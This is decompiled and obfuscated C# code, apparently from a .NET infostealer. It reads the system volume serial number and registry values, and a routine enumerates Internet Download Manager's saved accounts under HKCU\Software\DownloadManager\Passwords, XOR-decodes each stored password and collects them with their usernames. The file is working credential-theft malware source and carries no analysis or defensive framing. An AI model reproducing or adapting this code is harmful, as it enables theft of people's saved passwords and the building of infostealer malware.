using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;

// Token: 0x02000041 RID: 65
[StandardModule]
internal sealed class lpx
{
	// Token: 0x0600018C RID: 396
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpq, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpz, int lrs, ref int lrt, ref int lru, ref int lrv, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lry, int lrx);

	// Token: 0x0600018D RID: 397 RVA: 0x0003398C File Offset: 0x00031B8C
	public static string lrw()
	{
		string result;
		try
		{
			string text = Interaction.Environ(<Module>.smethod_strings_decryptor(304616 -> "SystemDrive"))) + "\\";
			string text2 = null;
			int lrs = 0;
			int num = 0;
			int num2 = 0;
			string text3 = null;
			int number;
			lpx.GetVolumeInformationA(ref text, ref text2, lrs, ref number, ref num, ref num2, ref text3, 0);
			result = Conversion.Hex(number);
		}
		catch (Exception ex)
		{
			for (;;)
			{
				IL_89:
				uint num3 = 1476127225u;
				for (;;)
				{
					uint num4;
					switch ((num4 = (num3 ^ 698053453u)) % 3u)
					{
					case 0u:
						goto IL_89;
					case 1u:
						result = null;
						num3 = (num4 * 3092459933u ^ 2872265182u);
						continue;
					}
					goto Block_3;
				}
			}
			Block_3:;
		}
		return result;
	}

	// Token: 0x0600018E RID: 398 RVA: 0x00033A3C File Offset: 0x00031C3C
	public static string lsq(string lsz)
	{
		int num;
		int num4;
		string text;
		object obj;
		try
		{
			for (;;)
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				for (;;)
				{
					IL_C1:
					uint num2 = 2341970300u;
					for (;;)
					{
						uint num3;
						int num5;
						switch ((num3 = (num2 ^ 3948753788u)) % 10u)
						{
						case 2u:
						{
							StreamReader streamReader = new StreamReader(lsz);
							num2 = (num3 * 64960566u ^ 131741973u);
							continue;
						}
						case 3u:
							goto IL_DF;
						case 4u:
							goto IL_59;
						case 5u:
							IL_C8:
							num4 = num5;
							switch (num)
							{
							case 0:
								break;
							case 1:
								goto IL_34;
							default:
								num2 = 4103599796u;
								continue;
							}
							break;
						case 6u:
							goto IL_34;
						case 7u:
						{
							StreamReader streamReader;
							text = streamReader.ReadToEnd().ToString();
							num2 = (num3 * 2401924094u ^ 2345621893u);
							continue;
						}
						case 8u:
							goto IL_C1;
						case 9u:
							goto IL_0C;
						}
						goto Block_3;
						IL_0C:
						num5 = 3;
						num2 = 3364748877u;
						continue;
						IL_34:
						int num6 = num4 + 1;
						num4 = 0;
						switch (num6)
						{
						case 0:
							goto IL_DD;
						case 1:
							goto IL_00;
						case 2:
							IL_59:
							num5 = 2;
							num2 = 2901695088u;
							break;
						case 3:
							goto IL_0C;
						case 4:
							goto IL_DF;
						default:
							num2 = 3717590489u;
							break;
						}
					}
				}
			}
			Block_3:
			IL_DD:
			goto IL_101;
			IL_DF:
			goto IL_10C;
		}
		catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_C8;
		}
		IL_101:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_10C:
		string result = text;
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	// Token: 0x0600018F RID: 399 RVA: 0x00033B70 File Offset: 0x00031D70
	public static string ltq(string ltz, string luv, string luy)
	{
		string result;
		try
		{
			string[] array = Strings.Split(ltz, luv, -1, CompareMethod.Binary);
			string[] array2 = Strings.Split(array[1], luy, -1, CompareMethod.Binary);
			result = array2[0];
		}
		catch (Exception ex)
		{
			result = <Module>.smethod_strings_decryptor(304688 -> "No Data"));
			for (;;)
			{
				IL_69:
				uint num = 2805173960u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 2499529235u)) % 3u)
					{
					case 0u:
						goto IL_69;
					case 1u:
						num = (num2 * 2968531424u ^ 1946447107u);
						continue;
					}
					goto Block_3;
				}
			}
			Block_3:;
		}
		return result;
	}

	// Token: 0x06000190 RID: 400 RVA: 0x00033C00 File Offset: 0x00031E00
	public static string luz(string lvy)
	{
		string text;
		int num4;
		int num5;
		object obj;
		try
		{
			for (;;)
			{
				IL_00:
				int num = 1;
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(<Module>.smethod_strings_decryptor(304664 -> "WScript.Shell")), ""));
				for (;;)
				{
					IL_13E:
					uint num2 = 3040044305u;
					for (;;)
					{
						uint num3;
						switch ((num3 = (num2 ^ 3968014358u)) % 11u)
						{
						case 0u:
							goto IL_152;
						case 1u:
							goto IL_7C;
						case 2u:
							goto IL_70;
						case 4u:
						{
							object instance = objectValue;
							Type type = null;
							string memberName = <Module>.smethod_strings_decryptor(304224 -> "RegRead"));
							object[] array = new object[]
							{
								lvy
							};
							object[] arguments = array;
							string[] argumentNames = null;
							Type[] typeArguments = null;
							bool[] array2 = new bool[]
							{
								true
							};
							object value = NewLateBinding.LateGet(instance, type, memberName, arguments, argumentNames, typeArguments, array2);
							if (array2[0])
							{
								lvy = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
							}
							text = Conversions.ToString(value);
							num2 = 3193670253u;
							continue;
						}
						case 5u:
							goto IL_13E;
						case 6u:
							IL_145:
							num4 = num;
							num2 = 3464943127u;
							continue;
						case 7u:
							goto IL_46;
						case 8u:
							num5 = 1;
							num2 = (num3 * 2051545371u ^ 1263723819u);
							continue;
						case 9u:
							switch (num5)
							{
							case 0:
								break;
							case 1:
								goto IL_46;
							default:
								num2 = (num3 * 3833207169u ^ 1740464875u);
								continue;
							}
							break;
						}
						goto Block_5;
						IL_46:
						int num6 = num4 + 1;
						num4 = 0;
						switch (num6)
						{
						case 0:
							goto IL_154;
						case 1:
							goto IL_00;
						case 2:
							IL_70:
							ProjectData.ClearProjectError();
							num2 = 4148705851u;
							break;
						case 3:
							IL_7C:
							num = 3;
							num2 = 3798194993u;
							break;
						case 4:
							goto IL_152;
						default:
							num2 = 2627601005u;
							break;
						}
					}
				}
			}
			Block_5:
			goto IL_178;
			IL_152:
			goto IL_183;
			IL_154:;
		}
		catch when (endfilter(obj is Exception & num5 != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_145;
		}
		IL_178:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_183:
		string result = text;
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	// Token: 0x06000191 RID: 401 RVA: 0x00033DB8 File Offset: 0x00031FB8
	public static string lxw(string lxq, int lxz)
	{
		string result;
		try
		{
			string[] array = hj.hk.FileSystem.ReadAllText(lxq, Encoding.Default).Split(new char[]
			{
				'\r'
			});
			if (lxz <= 0)
			{
				goto IL_66;
			}
			IL_35:
			int num = -238706404;
			IL_3A:
			checked
			{
				switch ((num ^ -224060062) % 5)
				{
				case 0:
					goto IL_35;
				case 1:
					IL_66:
					if (lxz < 0)
					{
						num = -518287775;
						goto IL_3A;
					}
					break;
				case 3:
					return array[lxz - 1];
				case 4:
					return array[array.Length + lxz - 1];
				}
				result = "";
			}
		}
		catch (Exception ex)
		{
			result = "";
			for (;;)
			{
				IL_D2:
				uint num2 = 3653569348u;
				for (;;)
				{
					uint num3;
					switch ((num3 = (num2 ^ 4070907234u)) % 3u)
					{
					case 0u:
						goto IL_D2;
					case 1u:
						num2 = (num3 * 118339759u ^ 246115650u);
						continue;
					}
					goto Block_6;
				}
			}
			Block_6:;
		}
		return result;
	}

	// Token: 0x02000042 RID: 66
	public class lnt
	{
		// Token: 0x06000193 RID: 403 RVA: 0x00033EB4 File Offset: 0x000320B4
		public static object lnu()
		{
			List<clo> list = new List<clo>();
			string text = <Module>.smethod_strings_decryptor(304520 -> "Software\DownloadManager\Passwords\"));
			IntPtr lmr = new IntPtr(-2147483647);
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text);
				if (registryKey.GetSubKeyNames().Length != 0)
				{
					for (;;)
					{
						IL_38C:
						uint num = 1239005974u;
						for (;;)
						{
							uint num2;
							byte[] array;
							int num5;
							clo clo;
							string text2;
							int num6;
							string text3;
							byte[] array2;
							int num9;
							string[] subKeyNames;
							int num10;
							switch ((num2 = (num ^ 590287255u)) % 24u)
							{
							case 0u:
							{
								int num3 = 0;
								int num4 = checked(array.Length - 1);
								num5 = num3;
								num = (num2 * 3609252376u ^ 3096604675u);
								continue;
							}
							case 1u:
								clo.cly = text2;
								num6 = 0;
								num = (num2 * 3630834902u ^ 1511029545u);
								continue;
							case 2u:
							{
								text3 = null;
								int num7 = 0;
								int num8 = checked(array2.Length - 1);
								num9 = num7;
								num = (num2 * 153857659u ^ 2354648626u);
								continue;
							}
							case 3u:
							{
								int num8;
								if (num9 > num8)
								{
									num = 713960151u;
									continue;
								}
								goto IL_246;
							}
							case 4u:
							{
								lpx.lnt.kqz kqz;
								lpx.lnt.lmo.RegOpenKeyEx(lmr, text + text2, 0, 131097, out kqz);
								array = new byte[257];
								array2 = new byte[257];
								num = (num2 * 2795421875u ^ 4252973262u);
								continue;
							}
							case 5u:
								num = (num2 * 2141172380u ^ 2965419280u);
								continue;
							case 6u:
								goto IL_246;
							case 7u:
							{
								lpx.lnt.kqz kqz = null;
								num = (num2 * 2348475938u ^ 321438173u);
								continue;
							}
							case 8u:
								goto IL_21B;
							case 9u:
								subKeyNames = registryKey.GetSubKeyNames();
								num10 = 0;
								num = (num2 * 2307255056u ^ 3503809946u);
								continue;
							case 10u:
								checked
								{
									num6++;
								}
								num = (num2 * 197838284u ^ 3809631753u);
								continue;
							case 11u:
								if (num10 >= subKeyNames.Length)
								{
									num = 1071262936u;
									continue;
								}
								goto IL_132;
							case 12u:
								goto IL_38C;
							case 13u:
							{
								lpx.lnt.kqz kqz;
								lpx.lnt.kqz lmq = kqz;
								string lmz = <Module>.smethod_strings_decryptor(304464 -> "User"));
								int lno = 0;
								int num11 = 0;
								byte[] lnr = array;
								int num12 = 256;
								lpx.lnt.lmo.RegQueryValueEx(lmq, lmz, lno, out num11, lnr, ref num12);
								lpx.lnt.kqz lmq2 = kqz;
								string lmz2 = <Module>.smethod_strings_decryptor(304568 -> "EncPassword"));
								int lno2 = 0;
								num12 = 0;
								byte[] lnr2 = array2;
								num11 = 256;
								lpx.lnt.lmo.RegQueryValueEx(lmq2, lmz2, lno2, out num12, lnr2, ref num11);
								clo = new clo();
								num = (num2 * 2035963795u ^ 1908246769u);
								continue;
							}
							case 14u:
								goto IL_94;
							case 15u:
								checked
								{
									num9++;
								}
								num = (num2 * 3043363683u ^ 2639571161u);
								continue;
							case 16u:
								goto IL_A6;
							case 17u:
								goto IL_132;
							case 18u:
								text3 += Conversions.ToString(Strings.ChrW((int)(array2[num9] ^ 15)));
								num = (num2 * 2139831197u ^ 180194314u);
								continue;
							case 19u:
								clo.clx = <Module>.smethod_strings_decryptor(304640 -> "Internet Download Manager"));
								list.Add(clo);
								checked
								{
									num10++;
								}
								num = (num2 * 4279572731u ^ 4092424813u);
								continue;
							case 20u:
							{
								int num4;
								if (num5 > num4)
								{
									num = 616502711u;
									continue;
								}
								goto IL_94;
							}
							case 21u:
								clo.clu = Encoding.Default.GetString(array);
								num6 = 0;
								num = (num2 * 222858106u ^ 2263229319u);
								continue;
							case 22u:
								checked
								{
									num5++;
								}
								num = (num2 * 4115706614u ^ 131493447u);
								continue;
							}
							goto Block_9;
							IL_94:
							if (array[num5] != 0)
							{
								num = 1311888541u;
								continue;
							}
							IL_A6:
							array = (byte[])Utils.CopyArray((Array)array, new byte[checked(num6 - 1 + 1)]);
							num = 99206338u;
							continue;
							IL_132:
							text2 = subKeyNames[num10];
							registryKey.OpenSubKey(text2);
							num = 1823432680u;
							continue;
							IL_21B:
							clo.clv = text3;
							num = 1612067380u;
							continue;
							IL_246:
							if (array2[num9] == 0)
							{
								goto IL_21B;
							}
							num = 756147885u;
						}
					}
					Block_9:;
				}
			}
			catch (Exception ex)
			{
			}
			return list;
		}

		// Token: 0x02000043 RID: 67
		public class kqz : SafeHandle
		{
			// Token: 0x06000194 RID: 404 RVA: 0x00034284 File Offset: 0x00032484
			public kqz() : base(IntPtr.Zero, true)
			{
			}

			// Token: 0x17000016 RID: 22
			// (get) Token: 0x06000195 RID: 405 RVA: 0x000342A0 File Offset: 0x000324A0
			public override bool IsInvalid
			{
				get
				{
					return this.handle == IntPtr.Zero;
				}
			}

			// Token: 0x06000196 RID: 406 RVA: 0x000342C0 File Offset: 0x000324C0
			protected override bool ReleaseHandle()
			{
				return lpx.lnt.lmo.RegCloseKey(this.handle) == 0;
			}
		}

		// Token: 0x02000044 RID: 68
		[SuppressUnmanagedCodeSecurity]
		public class lmo
		{
			// Token: 0x06000198 RID: 408
			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			[DllImport("Advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
			public static extern int RegOpenKeyEx([In] IntPtr lmr, [In] string lms, int lmt, [In] int lmu, out lpx.lnt.kqz lmv);

			// Token: 0x06000199 RID: 409
			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
			[DllImport("Advapi32", SetLastError = true)]
			public static extern int RegCloseKey(IntPtr lmx);

			// Token: 0x0600019A RID: 410
			[DllImport("Advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
			public static extern int RegQueryValueEx([In] lpx.lnt.kqz lmq, [In] string lmz, int lno, out int lnp, [Out] byte[] lnr, [In] [Out] ref int lns);
		}
	}
}
